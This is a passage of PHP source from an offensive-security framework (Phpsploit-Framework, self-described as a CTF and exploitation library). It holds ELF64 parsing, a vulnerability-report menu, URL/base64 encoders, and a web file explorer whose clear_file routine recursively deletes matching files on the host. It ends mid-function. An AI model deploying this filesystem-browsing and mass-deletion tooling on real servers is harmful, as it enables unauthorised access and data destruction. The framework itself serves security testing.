    public function get_encode_key ()
    {
        return $this->_key;
    }

    public function get_encode_size ()
    {
        return $this->_size;
    }

    public function get_head ()
    {
        $_block_name    = Class_Base_Format::format_name_read ( substr ( $this->_head , Class_Base_BlockHead::get_head_block_name_offset () , Class_Base_BlockHead::get_head_block_name_size () ) );
        $_block_key     = Class_Base_Format::format_key_read ( substr ( $this->_head , Class_Base_BlockHead::get_head_block_key_offset () , Class_Base_BlockHead::get_head_block_key_size () ) );
        $_content_size  = Class_Base_Format::format_size_read ( substr ( $this->_head , Class_Base_BlockHead::get_head_content_size_offset () , Class_Base_BlockHead::get_head_content_size_size () ) );
        $_block_status  = Class_Base_Format::format_status_read ( substr ( $this->_head , Class_Base_BlockHead::get_head_block_status_offset () , Class_Base_BlockHead::get_head_block_status_size () ) );
        $_block_mode    = Class_Base_Format::format_mode_read ( substr ( $this->_head , Class_Base_BlockHead::get_head_block_mode_offset () , Class_Base_BlockHead::get_head_block_mode_size () ) );
        $_block_type    = Class_Base_Format::format_type_read ( substr ( $this->_head , Class_Base_BlockHead::get_head_block_type_offset () , Class_Base_BlockHead::get_head_block_type_size () ) );
        $_content_type  = Class_Base_Format::format_type_read ( substr ( $this->_head , Class_Base_BlockHead::get_head_content_type_offset () , Class_Base_BlockHead::get_head_content_type_size () ) );
        $_reserved      = Class_Base_Format::format_reserved_read ( substr ( $this->_head , Class_Base_BlockHead::get_head_reserved_offset () , Class_Base_BlockHead::get_head_reserved_size () ) );
        $_head_end_flag = Class_Base_Format::format_end_flag_read ( substr ( $this->_head , Class_Base_BlockHead::get_head_end_flag_offset () , Class_Base_BlockHead::get_head_end_flag_size () ) );
        $_head          = new Class_Base_BlockHead( $_block_name , $_block_key , $_content_size , $_block_status , $_block_mode , $_block_type , $_content_type , $_reserved , $_head_end_flag );
        return $_head;
    }

    public function get_encode_head ()
    {
        return $this->_head;
    }

    public function get_content ()
    {
        $_content = Class_Base_Format::content_to_string ( $this->_content );
        $_size    = Class_Base_Format::format_size_read ( substr ( $this->_head , Class_Base_BlockHead::get_head_content_size_offset () , Class_Base_BlockHead::get_head_content_size_size () ) );
        $_content = new Class_Base_BlockContent( $_content , $_size );
        return $_content;
    }

    public function get_encode_content ()
    {
        return $this->_content;
    }

    public function get_end_flag ()
    {
        $_end_flag = Class_Base_Format::end_flag_to_string ( $this->_content , Class_Base_BlockEndFlag::get_end_flag_size () );
        $_end_flag = new Class_Base_BlockEndFlag( $_end_flag );
        return $_end_flag;
    }

    public function get_encode_end_flag ()
    {
        return $this->_end_flag;
    }

    public function get_block_string ()
    {
        $_block_string = ( $this->_head . $this->_content . $this->_end_flag );
        return $_block_string;
    }

    public function get_block_string_size ()
    {
        $_block_string        = self::get_block_string ();
        $_block_string_length = strlen ( $_block_string );
        return $_block_string_length;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-5-6
 * Time: 下午1:57
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Base_Elf64_Section_Shstrtab extends Class_Base
{
    private static $_section_shstrtabs      = array ();
    private static $_section_shstrtab_names = array ();
    private        $_content                = null;
    private        $_names                  = null;

    public static function create_elf64_section_shstrtab ( $file_path , $section_shstrtab_header )
    {
        if ( ( is_string ( $file_path ) ) && ( strlen ( $file_path ) > 0 ) && ( file_exists ( $file_path ) ) && ( is_file ( $file_path ) ) && ( is_object ( $section_shstrtab_header ) && ( $section_shstrtab_header instanceof Class_Base_Elf64_Section_Header ) ) ) {
            $_tmp_file_point = fopen ( $file_path , "rb" );
            if ( ! empty( $_tmp_file_point ) ) {
                fseek ( $_tmp_file_point , $section_shstrtab_header->get_sh_offset () , SEEK_SET );
                $_shstrtab_section_content = @fread ( $_tmp_file_point , $section_shstrtab_header->get_sh_size () );
                fclose ( $_tmp_file_point );
                if ( ( ! is_null ( $_shstrtab_section_content ) ) ) {
                    if ( strpos ( $_shstrtab_section_content , chr ( 46 ) ) !== false ) {
                        $_section_shstrtab_object = self::$_section_shstrtabs[ $file_path ] = new Class_Base_Elf64_Section_Shstrtab( $_shstrtab_section_content );
                        $_section_shstrtab_names  = explode ( chr ( 46 ) , $_shstrtab_section_content );
                        array_shift ( $_section_shstrtab_names );
                        self::$_section_shstrtab_names[ $file_path ] = $_section_shstrtab_object->_names = $_section_shstrtab_names;
                        $_section_shstrtab_names                     = null;
                        unset( $_section_shstrtab_names );
                        return $_section_shstrtab_object;
                    }
                }
            }
        }
        return false;
    }

    public static function get_section_name ( $file_path , $sh_name )
    {
        if ( ( is_string ( $file_path ) ) && ( strlen ( $file_path ) > 0 ) && ( file_exists ( $file_path ) ) && ( is_file ( $file_path ) ) ) {
            if ( ( ! empty( self::$_section_shstrtabs[ $file_path ] ) ) && ( is_object ( self::$_section_shstrtabs[ $file_path ] ) ) && ( self::$_section_shstrtabs[ $file_path ] instanceof Class_Base_Elf64_Section_Shstrtab ) ) {
                $_shstrtab_section_content        = self::$_section_shstrtabs[ $file_path ]->get_content ();
                $_shstrtab_section_content_length = strlen ( $_shstrtab_section_content );
                if ( ( is_integer ( $sh_name ) ) && ( $sh_name < $_shstrtab_section_content_length ) && ( ( $sh_name != ( -1 ) ) && ( $sh_name != ( $_shstrtab_section_content_length - 1 ) ) ) ) {
                    $_end_dot_position = strpos ( $_shstrtab_section_content , chr ( 46 ) , ( $sh_name + 1 ) );
                    $_size             = ( $_end_dot_position - $sh_name );
                    if ( ( ( $sh_name + $_size ) < $_shstrtab_section_content_length ) ) {
                        $_sh_name = substr ( $_shstrtab_section_content , $sh_name , $_size );
                        $_sh_name = str_replace ( chr ( 0 ) , "" , $_sh_name );
                        return $_sh_name;
                    }
                }
            }
        }
        return false;
    }

    public function __construct ( $shstrtab_section_content )
    {
        if ( is_string ( $shstrtab_section_content ) ) {
            $this->_content = $shstrtab_section_content;
        }
    }

    public function __destruct ()
    {
        // TODO: Implement __destruct() method.
    }

    public function get_content ()
    {
        return $this->_content;
    }

    public function get_content_length ()
    {
        $_content_length = strlen ( $this->_content );
        return $_content_length;
    }

    public function get_names ()
    {
        return $this->_names;
    }

    public function get_sh_name ( $offset )
    {
        $_content_length = $this->get_content_length ();
        if ( ( is_integer ( $offset ) ) && ( $offset < $_content_length ) && ( ( $offset != ( -1 ) ) && ( $offset != ( $_content_length - 1 ) ) ) ) {
            $_end_dot_position = strpos ( $this->_content , chr ( 46 ) , ( $offset + 1 ) );
            $_size             = ( $_end_dot_position - $offset );
            if ( ( ( $offset + $_size ) < $_content_length ) ) {
                $_sh_name = substr ( $this->_content , $offset , $_size );
                $_sh_name = str_replace ( chr ( 0 ) , "" , $_sh_name );
                return $_sh_name;
            }
        }
        return false;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-4-8
 * Time: 下午3:40
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_View_Report_Menu
{
    private static $_menu = null;

    public static function menu ( $params = array () )
    {
        if ( ! is_array ( $params ) ) {
            $params = array ();
        }
        if ( empty( self::$_menu ) ) {
            self::$_menu = array (
                array (
                    "title"    => "create_vulnerability_report" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/report/create_vulnerability_report" , array () ) ,
                ) ,
                array (
                    "title"    => "edit_vulnerability_report" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/report/edit_vulnerability_report" , array () ) ,
                ) ,
                array (
                    "title"    => "show_vulnerability_report" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/report/show_vulnerability_report" , array () ) ,
                ) ,
                array (
                    "title"    => "export_vulnerability_report" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/report/export_vulnerability_report" , array () ) ,
                    "window"   => "_blank" ,
                ) ,
                array (
                    "title"    => "clear_vulnerability_report" ,
                    "describe" => "" ,
                    "href"     => 'javascript:if(confirm("Are you sure you want to clear the vulnerability report? After clearing, the content of the vulnerability report you created and edited will completely disappear and cannot be restored! Execute clear (select \'OK\'), discard clear (select \'Cancel\').")){document.location.href="'.Class_Base_Response::get_url ( "/report/clear_vulnerability_report" , array ( "rand" => time () ) ) .'";}',
                ) ,
            );
        }
        return self::$_menu;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-1-24
 * Time: 上午11:34
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Operate_File extends Class_Root implements Interface_Operate
{
    public static function search_file ( $search_path , $search_filename , $search_progress_id , $search_errors_id , $search_result_id , $usleep = 100 , $debug = 0 )
    {
        if ( ! is_integer ( $usleep ) ) {
            $usleep = 100;
        }
        if ( is_string ( $search_path ) && ( is_string ( $search_filename ) ) ) {
            $_search_path            = str_replace ( "\\" , "/" , $search_path );
            $_search_filename_length = strlen ( $search_filename );
            if ( file_exists ( $_search_path ) && is_dir ( $search_path ) ) {
                if ( $_search_path == "/" ) {
                    throw new \Exception( "Unable to directly search for the corresponding file in the root directory! Please enter a specific path to start searching in the corresponding directory!" , 0 );
                }
                $_current_directory        = $search_path;
                $_current_directory_object = dir ( $_current_directory );
                if ( $_current_directory_object === false ) {
                    Class_Base_Response::output_div_inner_html ( $search_errors_id , ( 'Directory <span style="color:red;">' . $_current_directory . '</span> is not authorized to access, search has skipped this directory' ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                    return;
                }
                while ( $file = $_current_directory_object->read () ) {
                    Class_Base_Response::check_browser_service_stop ();
                    if ( $file !== false ) {
                        $_current_child_item = ( $_current_directory . "/" . $file );
                        if ( strlen ( $file ) >= $_search_filename_length ) {
                            if ( strpos ( $file , $search_filename ) !== false ) {
                                if ( is_cli () ) {
                                    Class_Base_Response::outputln ( $_current_child_item , ( ( is_dir ( $_current_child_item ) ? "dir" : "file" ) . " : " ) );
                                } else {
                                    Class_Base_Response::output_div_inner_html ( $search_result_id , ( ( is_dir ( $_current_child_item ) ) ? ( '<a href="' . Class_Base_Response::get_url ( "/file/explorer" , array ( "current_directory_path" => $_current_child_item ) ) . '">' ) : ( '<a href="' . Class_Base_Response::get_url ( "/file/detail" , array ( "file_path" => $_current_child_item ) ) . '">' ) ) . ( ( ( is_dir ( $_current_child_item ) ? "dir" : "file" ) . " : " ) . $_current_child_item ) . ( '</a>' ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                                }
                            }
                        }
                        if ( is_dir ( $_current_child_item ) && ( $_current_child_item != ( $_current_directory . "/." ) ) && ( $_current_child_item != ( $_current_directory . "/.." ) ) ) {
                            $_current_child_directory = ( $_current_directory . "/" . $file );
                            if ( is_cli () ) {
                            } else {
                                Class_Base_Response::output_div_inner_html ( $search_progress_id , ( '<a href="' . Class_Base_Response::get_url ( "/file/explorer" , array ( "current_directory_path" => $_current_child_directory ) ) . '">' . "dir : " . $_current_child_directory . '</a>' ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_COVER );
                            }
                            self::search_file ( $_current_child_directory , $search_filename , $search_progress_id , $search_errors_id , $search_result_id , $usleep );
                        } else if ( is_file ( $_current_child_item ) ) {
                            $_current_child_file = ( $_current_directory . "/" . $file );
                            if ( is_cli () ) {
                            } else {
                                Class_Base_Response::output_div_inner_html ( $search_progress_id , ( '<a href="' . Class_Base_Response::get_url ( "/file/detail" , array ( "file_path" => $_current_child_file ) ) . '">' . "file : " . $_current_child_file . '</a>' ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_COVER );
                            }
                        }
                        usleep ( $usleep );
                    }
                }
            }
        }

    }

    public static function explorer ( $current_directory_path , $search_progress_id , $search_errors_id , $search_result_id , $directory_uri , $file_uri , $uri_params = array ( "directory_field_name" => "current_directory_path" , "file_field_name" => "current_file_path" ) , $debug = 0 )
    {
        if ( is_string ( $current_directory_path ) && ( strlen ( $current_directory_path ) > 0 ) && ( ( is_string ( $directory_uri ) ) && ( is_string ( $file_uri ) ) ) && ( is_array ( $uri_params ) ) && ( isset( $uri_params[ "directory_field_name" ] ) ) && ( is_string ( $uri_params[ "directory_field_name" ] ) ) && ( isset( $uri_params[ "file_field_name" ] ) ) && ( is_string ( $uri_params[ "file_field_name" ] ) ) ) {
            $current_directory_path = str_replace ( "\\" , "/" , $current_directory_path );
            $directory_uri          = str_replace ( "\\" , "/" , $directory_uri );
            $file_uri               = str_replace ( "\\" , "/" , $file_uri );
            if ( ! Class_Base_Format::is_field_name ( $uri_params[ "directory_field_name" ] ) ) {
                throw new \Exception( ( "directory_field_name is error , directory_field_name : " . print_r ( $uri_params[ "directory_field_name" ] , true ) ) , 0 );
            }
            if ( ! Class_Base_Format::is_field_name ( $uri_params[ "file_field_name" ] ) ) {
                throw new \Exception( ( "file_field_name is error , file_field_name : " . print_r ( $uri_params[ "file_field_name" ] , true ) ) , 0 );
            }
            if ( file_exists ( $current_directory_path ) && is_dir ( $current_directory_path ) ) {
                Class_Base_Response::output_div_inner_html ( $search_progress_id , "current directory : " . $current_directory_path , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_COVER );
                $_current_directory_object = dir ( $current_directory_path );
                if ( $_current_directory_object === false ) {
                    Class_Base_Response::output_div_inner_html ( $search_errors_id , ( 'Errors : Directory <span style="color:red;">' . $current_directory_path . '</span> is not authorized to access, search has skipped this directory' ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                    return;
                }
                while ( $file = $_current_directory_object->read () ) {
                    if ( $file === false ) {
                        continue;
                    }
                    $_current_child_item = ( $current_directory_path . "/" . $file );
                    if ( is_dir ( $_current_child_item ) && ( $_current_child_item != ( $current_directory_path . "/." ) ) && ( $_current_child_item != ( $current_directory_path . "/.." ) ) ) {
                        if ( substr ( $current_directory_path , ( strlen ( $current_directory_path ) - 1 ) , 1 ) != "/" ) {
                            $_current_child_directory = ( $current_directory_path . "/" . $file );
                        } else {
                            $_current_child_directory = ( $current_directory_path . $file );
                        }
                        if ( is_cli () ) {
                        } else {
                            Class_Base_Response::output_div_inner_html ( $search_result_id , 'current directory child directory : <a href="' . Class_Base_Response::get_url ( $directory_uri , array ( $uri_params[ "directory_field_name" ] => $_current_child_directory ) ) . '">' . $_current_child_directory . '</a>' , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                        }
                    } else if ( is_file ( $_current_child_item ) ) {
                        if ( substr ( $current_directory_path , ( strlen ( $current_directory_path ) - 1 ) , 1 ) != "/" ) {
                            $_current_child_file = ( $current_directory_path . "/" . $file );
                        } else {
                            $_current_child_file = ( $current_directory_path . $file );
                        }
                        if ( is_cli () ) {
                        } else {
                            Class_Base_Response::output_div_inner_html ( $search_result_id , 'current directory child file : <a href="' . Class_Base_Response::get_url ( $file_uri , array ( $uri_params[ "file_field_name" ] => $_current_child_file ) ) . '">' . $_current_child_file . '</a>' , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                        }
                    }
                }
            }
        }
    }

    public static function get_file_info ( $file_path , $file_content_read_offset = 0 , $data_type = Class_Base_File::TYPE_DATA_BIN )
    {
        $_file_info = Class_Base_File::get_file_info ( $file_path , $file_content_read_offset , $data_type );
        return $_file_info;
    }

    public static function create_file ( $current_directory_path , $file_name , $data_type , $file_content , $file_size_limit = Class_Base_File::SIZE_FILE_CONTENT_LIMIT , $debug = 0 )
    {
        $_create_info = Class_Base_File::create_file ( $current_directory_path , $file_name , $data_type , $file_content , $file_size_limit , $debug );
        return $_create_info;
    }

    public static function update_file ( $file_path , $file_content , $data_type , $file_size_limit = Class_Base_File::SIZE_FILE_CONTENT_LIMIT , $debug = 0 )
    {
        $_update_info = Class_Base_File::update_file ( $file_path , $file_content , $data_type , $file_size_limit , $debug );
        return $_update_info;
    }

    public static function delete_file ( $file_path , $file_size_limit = Class_Base_File::SIZE_FILE_CONTENT_LIMIT , $debug = 0 )
    {
        $_delete_info = Class_Base_File::delete_file ( $file_path , $file_size_limit , $debug );
        return $_delete_info;
    }

    public static function clear_file ( $search_path , $search_filename , $search_progress_id , $search_errors_id , $search_result_id , $usleep = 100 , $debug = 0 )
    {
        if ( ! is_integer ( $usleep ) ) {
            $usleep = 100;
        }
        if ( is_string ( $search_path ) && ( is_string ( $search_filename ) ) ) {
            $_search_path            = str_replace ( "\\" , "/" , $search_path );
            $_search_filename_length = strlen ( $search_filename );
            if ( file_exists ( $_search_path ) && is_dir ( $search_path ) ) {
                if ( $_search_path == "/" ) {
                    throw new \Exception( "Unable to directly search for the corresponding file in the root directory! Please enter a specific path to start searching in the corresponding directory!" , 0 );
                }
                $_current_directory        = $search_path;
                $_current_directory_object = dir ( $_current_directory );
                if ( $_current_directory_object === false ) {
                    Class_Base_Response::output_div_inner_html ( $search_errors_id , ( 'Directory <span style="color:red;">' . $_current_directory . '</span> is not authorized to access, search has skipped this directory' ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                    return;
                }
                while ( $file = $_current_directory_object->read () ) {
                    Class_Base_Response::check_browser_service_stop ();
                    if ( $file !== false ) {
                        $_current_child_item = ( $_current_directory . "/" . $file );
                        if ( strlen ( $file ) >= $_search_filename_length ) {
                            if ( strpos ( $file , $search_filename ) !== false ) {
                                if ( Class_Base_File::is_permission ( $_current_child_item ) ) {
                                    try {
                                        $_file_info = Class_Base_File::delete_file ( $_current_child_item , ( Class_Base_File::SIZE_FILE_CONTENT_LIMIT * 10 ) , $debug );
                                        if ( $_file_info !== false ) {
                                            if ( is_cli () ) {
                                                Class_Base_Response::outputln ( $_current_child_item , ( ( is_dir ( $_current_child_item ) ? "dir" : "file" ) . " : " ) );
                                            } else {
                                                Class_Base_Response::output_div_inner_html ( $search_result_id , ( ( "The file has been successfully deleted ! File path : " ) . $_current_child_item ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                                            }
                                        } else {
                                            Class_Base_Response::output_div_inner_html ( $search_errors_id , ( '<span style="color:red;">' . ( "The deletion of the target file failed. You may not have permission to clear it ! Please contact the server administrator promptly for communication and resolution ! Destination file path : " ) . $_current_child_item . '</span>' ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                                        }
                                    } catch ( \Exception $e ) {
                                        if ( $e->getCode () == Class_Base_Error::FILE_EXCEPTION_DELETE ) {
                                            Class_Base_Response::output_div_inner_html ( $search_errors_id , ( '<span style="color:red;">' . ( "The deletion of the target file failed. You may not have permission to clear it ! This may be caused by reasons such as the size of the target file exceeding the security limit ! Please contact the server administrator promptly for communication and resolution ! Destination file path : " ) . $_current_child_item . '</span>' ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                                        } else {
                                            throw $e;
                                        }
                                    }
                                } else {
                                    Class_Base_Response::output_div_inner_html ( $search_errors_id , ( '<span style="color:red;">' . ( "The target file may be a directory or cannot be deleted due to security restrictions or other reasons ! Please contact the server administrator promptly for communication and resolution ! Target path : " ) . $_current_child_item . '</span>' ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                                }
                            }
                        }
                        if ( is_dir ( $_current_child_item ) && ( $_current_child_item != ( $_current_directory . "/." ) ) && ( $_current_child_item != ( $_current_directory . "/.." ) ) ) {
                            $_current_child_directory = ( $_current_directory . "/" . $file );
                            if ( is_cli () ) {
                            } else {
                                Class_Base_Response::output_div_inner_html ( $search_progress_id , ( "dir : " . $_current_child_directory ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_COVER );
                            }
                            self::clear_file ( $_current_child_directory , $search_filename , $search_progress_id , $search_errors_id , $search_result_id , $usleep );
                        } else if ( is_file ( $_current_child_item ) ) {
                            $_current_child_file = ( $_current_directory . "/" . $file );
                            if ( is_cli () ) {
                            } else {
                                Class_Base_Response::output_div_inner_html ( $search_progress_id , ( "file : " . $_current_child_file ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_COVER );
                            }
                        }
                        usleep ( $usleep );
                    }
                }
            }
        }

    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-4-8
 * Time: 下午3:40
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_View_Bottom
{
    private static $_bottom = null;

    private static function _init ()
    {
        if ( empty( self::$_bottom ) ) {
            self::$_bottom = array (
                "menu"    => array (
                    array (
                        "title"    => "" ,
                        "describe" => "" ,
                        "href"     => Class_Base_Response::get_url ( "/index" , array ( "rand" => time () ) ) ,
                    ) ,
                ) ,
                "content" => "" ,
            );
        }
    }

    public static function bottom ( $menu = array ( array ( "title" => "" , "describe" => "" , "href" => "#" , ) , ) , $content = "" , $javascript = '<script type="text/javascript">function init(){ console.log("Page loading completed ! "); }function submit(form_object){ return true;}</script>' )
    {
        self::_init ();
        if ( is_array ( $menu ) ) {
            if ( ! empty( $menu ) ) {
                foreach ( $menu as $index => $item ) {
                    if ( ! is_array ( $menu[ $index ] ) ) {
                        $menu[ $index ] = array ( "title" => "" , "describe" => "" , "href" => "#" );
                    }
                    if ( ! isset( $menu[ $index ][ "title" ] ) ) {
                        $menu[ $index ][ "title" ] = "";
                    }
                    if ( ! isset( $menu[ $index ][ "describe" ] ) ) {
                        $menu[ $index ][ "describe" ] = "";
                    }
                    if ( ! isset( $menu[ $index ][ "href" ] ) ) {
                        $menu[ $index ][ "href" ] = "#";
                    }
                }
                self::$_bottom[ "menu" ] = $menu;
            }
        }
        if ( is_string ( $content ) ) {
            self::$_bottom[ "content" ] = $content;
        }
        if ( is_string ( $content ) ) {
            self::$_bottom[ "javascript" ] = $javascript;
        }
        return self::$_bottom;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-4-15
 * Time: 下午6:52
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Controller_Security
{
    public static function index ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        if ( ! is_cli () ) {
            $_top    = Class_View_Top ::top ();
            $_body   = array (
                "menu"    => Class_View_Security_Menu ::menu () ,
                "content" => "" ,
            );
            $_bottom = Class_View_Bottom ::bottom ();
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        }
        return null;
    }

    public static function url ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        $_string = Class_Base_Request ::form ( "string" , Class_Base_Request::TYPE_STRING , "" );
        $_type   = Class_Base_Request ::form ( "type" , Class_Base_Request::TYPE_INTEGER , Class_Base_Security::TYPE_URL_ENCODE );
        if ( ! is_cli () ) {
            $_form_top    = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Url Data Encode / Decode</div>';
            $_form_top    .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This functional module is mainly used for URL encoding or decoding behavior of corresponding data.</div>';
            $_form        = array (
                "action"    => "/security/url" ,
                "selects"   => array (
                    array (
                        "title"   => "( Encode / Decode )   : " ,
                        "name"    => "type" ,
                        "options" => array (
                            array ( "describe" => "encode data" , "title" => "Encode Data" , "value" => Class_Base_Security::TYPE_URL_ENCODE , "selected" => ( ( $_type == Class_Base_Security::TYPE_URL_ENCODE ) ? "selected" : "" ) ) ,
                            array ( "describe" => "decode data" , "title" => "Decode Data" , "value" => Class_Base_Security::TYPE_URL_DECODE , "selected" => ( ( $_type == Class_Base_Security::TYPE_URL_DECODE ) ? "selected" : "" ) ) ,
                        ) ,
                    ) ,
                ) ,
                "textareas" => array (
                    array (
                        "title" => "( Raw Data )   : " ,
                        "name"  => "string" ,
                        "value" => $_string ,
                    ) ,
                    array (
                        "title"    => "( Result Data )   : " ,
                        "name"     => "result" ,
                        "value"    => ( ( $_type == Class_Base_Security::TYPE_URL_DECODE ) ? urldecode ( $_string ) : urlencode ( $_string ) ) ,
                        "disabled" => "disabled" ,
                    ) ,
                ) ,
            );
            $_top         = Class_View_Top ::top ();
            $_body        = array (
                "menu"    => Class_View_Security_Menu ::menu ( array () ) ,
                "content" => ( ( $_form_top ) . Class_View ::form_body ( $_form ) ) ,
            );
            $_bottom_menu = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_content     = '<div></div>';
            $_bottom      = Class_View_Bottom ::bottom ( $_bottom_menu , $_content );
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        } else {
            Class_Base_Response ::outputln ( "\n" . 'This functional module is currently not suitable for command line environments, and this issue may be improved in future versions!' );
        }
        return null;
    }

    public static function base64 ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        $_string = Class_Base_Request ::form ( "string" , Class_Base_Request::TYPE_STRING , "" );
        $_type   = Class_Base_Request ::form ( "type" , Class_Base_Request::TYPE_INTEGER , Class_Base_Security::TYPE_BASE64_ENCODE );
        if ( ! is_cli () ) {
            $_form_top    = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Base64 Data Encode / Decode</div>';
            $_form_top    .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This functional module is mainly used for BASE64 mode encoding or decoding behavior of corresponding data.</div>';
            $_form        = array (
                "action"    => "/security/base64" ,
                "selects"   => array (
                    array (
                        "title"   => "( Encode / Decode )   : " ,
                        "name"    => "type" ,
                        "options" => array (
                            array ( "describe" => "encode data" , "title" => "Encode Data" , "value" => Class_Base_Security::TYPE_BASE64_ENCODE , "selected" => ( ( $_type == Class_Base_Security::TYPE_BASE64_ENCODE ) ? "selected" : "" ) ) ,
                            array ( "describe" => "decode data" , "title" => "Decode Data" , "value" => Class_Base_Security::TYPE_BASE64_DECODE , "selected" => ( ( $_type == Class_Base_Security::TYPE_BASE64_DECODE ) ? "selected" : "" ) ) ,
                        ) ,
                    ) ,
                ) ,
                "textareas" => array (
                    array (
                        "title" => "( Raw Data )   : " ,
                        "name"  => "string" ,
                        "value" => $_string ,
                    ) ,
                    array (
                        "title"    => "( Result Data )   : " ,
                        "name"     => "result" ,
                        "value"    => ( ( $_type == Class_Base_Security::TYPE_BASE64_DECODE ) ? base64_decode ( $_string ) : base64_encode ( $_string ) ) ,
                        "disabled" => "disabled" ,
                    ) ,
                ) ,
            );
            $_top         = Class_View_Top ::top ();
            $_body        = array (
                "menu"    => Class_View_Security_Menu ::menu ( array () ) ,
                "content" => ( ( $_form_top ) . Class_View ::form_body ( $_form ) ) ,
            );
            $_bottom_menu = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_content     = '<div></div>';
